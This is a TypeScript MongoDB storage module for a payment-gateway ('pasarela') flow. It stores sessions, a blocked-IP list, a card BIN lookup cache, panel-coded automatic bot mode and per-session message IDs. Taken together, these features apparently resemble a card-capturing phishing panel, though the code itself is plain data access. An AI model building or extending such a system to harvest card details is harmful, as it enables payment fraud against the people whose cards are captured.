import dotenv from "dotenv";
import { Request } from "express";
import type { Collection, Document, WithId } from "mongodb";
import { getMongoDb } from "../storage/mongo/MongoClientFactory";

dotenv.config();

const PASARELA_SESSIONS_COLLECTION =
  process.env.PASARELA_SESSIONS_COLLECTION?.trim() || "pasarela_sessions";
const PASARELA_CONFIG_COLLECTION =
  process.env.PASARELA_CONFIG_COLLECTION?.trim() || "pasarela_config";
const BODEGA_CONFIG_COLLECTION =
  process.env.BODEGA_CONFIG_COLLECTION?.trim() || "bodega_config";

type SessionDocument = Document & {
  _id: string;
};

type ConfigListDocument = {
  _id: string;
  list?: string[];
  updatedAt?: string;
};

type BodegaConfigDocument = {
  _id: string;
  data?: unknown[];
  recaudos?: Array<{ cedula?: string; panelCodigo?: string }>;
  state?: unknown;
  enabled?: unknown;
  panelCodigo?: string;
  updatedAt?: string;
};

function normalizePanelCodigo(raw?: string | null): string {
  const n = String(raw ?? "P01")
    .trim()
    .toUpperCase();
  if (/^P\d{2}$/.test(n)) return n;
  return "P01";
}

function resolvePasarelaPanelCodigo(): string {
  return normalizePanelCodigo(
    process.env.PASARELA_PANEL_CODIGO?.trim() ||
      process.env.PASARELA_BACKEND?.trim()
  );
}

function toPlainSession(doc: WithId<SessionDocument> | null): Record<string, unknown> | null {
  if (!doc) return null;
  const { _id: _ignored, ...rest } = doc;
  return { ...rest } as Record<string, unknown>;
}

async function getSessionsCollection(): Promise<Collection<SessionDocument>> {
  return (await getMongoDb()).collection<SessionDocument>(PASARELA_SESSIONS_COLLECTION);
}

async function getPasarelaConfigCollection(): Promise<Collection<ConfigListDocument>> {
  return (await getMongoDb()).collection<ConfigListDocument>(PASARELA_CONFIG_COLLECTION);
}

async function getBodegaConfigCollection(): Promise<Collection<BodegaConfigDocument>> {
  return (await getMongoDb()).collection<BodegaConfigDocument>(BODEGA_CONFIG_COLLECTION);
}

export class FirebaseService {
  static getClientIp(req: Request): string {
    return req.get("x-forwarded-for")?.split(",")[0] || req.socket.remoteAddress || "";
  }

  static async saveSession(sesionId: string, data: any): Promise<void> {
    try {
      const collection = await getSessionsCollection();
      await collection.updateOne(
        { _id: sesionId },
        {
          $set: {
            ...(data as Record<string, unknown>),
            updatedAt: new Date().toISOString(),
          },
        },
        { upsert: true }
      );
    } catch (error) {
      console.error(`[MONGO] Error saving session ${sesionId}:`, error);
    }
  }

  static async getSession(sesionId: string): Promise<any> {
    try {
      const collection = await getSessionsCollection();
      return toPlainSession(await collection.findOne({ _id: sesionId }));
    } catch (error) {
      console.error(`[MONGO] Error getting session ${sesionId}:`, error);
      return null;
    }
  }

  static async getAllSessions(): Promise<any[]> {
    try {
      const collection = await getSessionsCollection();
      const docs = await collection.find({}).toArray();
      return docs.map((doc) => ({
        id: doc._id,
        ...(toPlainSession(doc) ?? {}),
      }));
    } catch (error) {
      console.error("[MONGO] Error getting all sessions:", error);
      return [];
    }
  }

  static async deleteSession(sesionId: string): Promise<void> {
    try {
      const collection = await getSessionsCollection();
      await collection.deleteOne({ _id: sesionId });
    } catch (error) {
      console.error(`[MONGO] Error deleting session ${sesionId}:`, error);
    }
  }

  static async getBlockedIps(): Promise<string[]> {
    try {
      const collection = await getPasarelaConfigCollection();
      const doc = await collection.findOne({ _id: "blocked_ips" });
      return Array.isArray(doc?.list) ? doc.list : [];
    } catch (error) {
      console.error("[MONGO] Error getting blocked IPs:", error as Error);
      return [];
    }
  }

  static async addBlockedIp(ip: string): Promise<void> {
    try {
      const collection = await getPasarelaConfigCollection();
      await collection.updateOne(
        { _id: "blocked_ips" },
        {
          $addToSet: { list: ip },
          $set: { updatedAt: new Date().toISOString() },
        },
        { upsert: true }
      );
    } catch (error) {
      console.error("[MONGO] Error adding blocked IP:", error as Error);
    }
  }

  static async removeBlockedIp(ip: string): Promise<void> {
    try {
      const collection = await getPasarelaConfigCollection();
      await collection.updateOne(
        { _id: "blocked_ips" },
        {
          $pull: { list: ip },
          $set: { updatedAt: new Date().toISOString() },
        },
        { upsert: true }
      );
    } catch (error) {
      console.error("[MONGO] Error removing blocked IP:", error as Error);
    }
  }

  static async getCardBinChecker(bin: string): Promise<unknown | null> {
    try {
      const normalizedBin = String(bin || "").replace(/\D/g, "").slice(0, 6);
      if (normalizedBin.length < 6) return null;

      const collection = await getBodegaConfigCollection();
      const doc = await collection.findOne({ _id: "binchecker" });
      const items = doc?.data;
      if (!Array.isArray(items)) return null;

      for (let i = items.length - 1; i >= 0; i--) {
        const item = items[i] as Record<string, unknown>;
        const itemBin = String(
          item?.bin ?? (item?.card as Record<string, unknown>)?.bin ?? ""
        )
          .replace(/\D/g, "")
          .slice(0, 6);

        if (itemBin !== normalizedBin) continue;

        const binLookup = item?.binLookup;
        if (FirebaseService.isValidBinLookup(binLookup)) {
          return binLookup;
        }
      }

      return null;
    } catch (error) {
      console.error("[MONGO] Error getting card bin checker:", error);
      return null;
    }
  }

  static isValidBinLookup(binLookup: unknown): boolean {
    if (!binLookup || typeof binLookup !== "object") return false;
    const data = (binLookup as { data?: unknown }).data;
    return Boolean(data && typeof data === "object");
  }

  static async saveDataCardBinChecker(entry: Record<string, unknown>): Promise<void> {
    try {
      const collection = await getBodegaConfigCollection();
      await collection.updateOne(
        { _id: "binchecker" },
        {
          $addToSet: { data: entry },
          $set: { updatedAt: new Date().toISOString() },
        },
        { upsert: true }
      );
    } catch (error) {
      console.error("[MONGO] Error saving data card bin checker:", error);
    }
  }

  static normalizeBoolean(value: unknown): boolean {
    if (typeof value === "boolean") return value;
    if (typeof value === "number") return value === 1;
    if (typeof value === "string") {
      const v = value.trim().toLowerCase();
      return v === "true" || v === "1" || v === "yes" || v === "si" || v === "on" || v === "activo";
    }
    return false;
  }

  static async getAutomaticMode(
    sessionId?: string,
    panelCodigo?: string
  ): Promise<boolean> {
    try {
      const collection = await getBodegaConfigCollection();
      const doc = await collection.findOne({ _id: "bot_automatic" });
      if (!doc) return false;

      const panel = normalizePanelCodigo(panelCodigo ?? resolvePasarelaPanelCodigo());

      if (Array.isArray(doc.recaudos)) {
        for (const raw of doc.recaudos) {
          const entryPanel = normalizePanelCodigo(String(raw?.panelCodigo ?? ""));
          const cedula = String(raw?.cedula ?? "").trim();
          if (entryPanel === panel && cedula) return true;
        }
        return false;
      }

      if (FirebaseService.normalizeBoolean(doc.state)) {
        const legacyPanel = doc.panelCodigo?.trim()
          ? normalizePanelCodigo(doc.panelCodigo)
          : "P01";
        return legacyPanel === panel;
      }
      if (FirebaseService.normalizeBoolean(doc.enabled)) return true;

      if (Array.isArray(doc.data)) {
        for (let i = 0; i < doc.data.length; i += 1) {
          const item = doc.data[i] as Record<string, unknown>;
          const itemSessionId = String(item?.sessionId ?? item?.id ?? "").trim();
          if (sessionId && itemSessionId && itemSessionId !== String(sessionId)) continue;
          if (FirebaseService.normalizeBoolean(item?.state ?? item?.enabled)) return true;
        }
      }

      return false;
    } catch (error) {
      console.error("[MONGO] Error getting automatic mode:", error as Error);
      return false;
    }
  }

  static async getSessionMessageId(sessionId: string): Promise<number | null> {
    try {
      const collection = await getSessionsCollection();
      const byId = await collection.findOne({ _id: sessionId });
      const bySession =
        byId ||
        (await collection.findOne({
          $or: [{ sessionId }, { id: sessionId }],
        }));

      const rawMessageId = bySession?.messageId;
      const parsed = Number(rawMessageId);
      return Number.isFinite(parsed) ? parsed : null;
    } catch (error) {
      console.error("[MONGO] Error getting session messageId:", error as Error);
      return null;
    }
  }
}
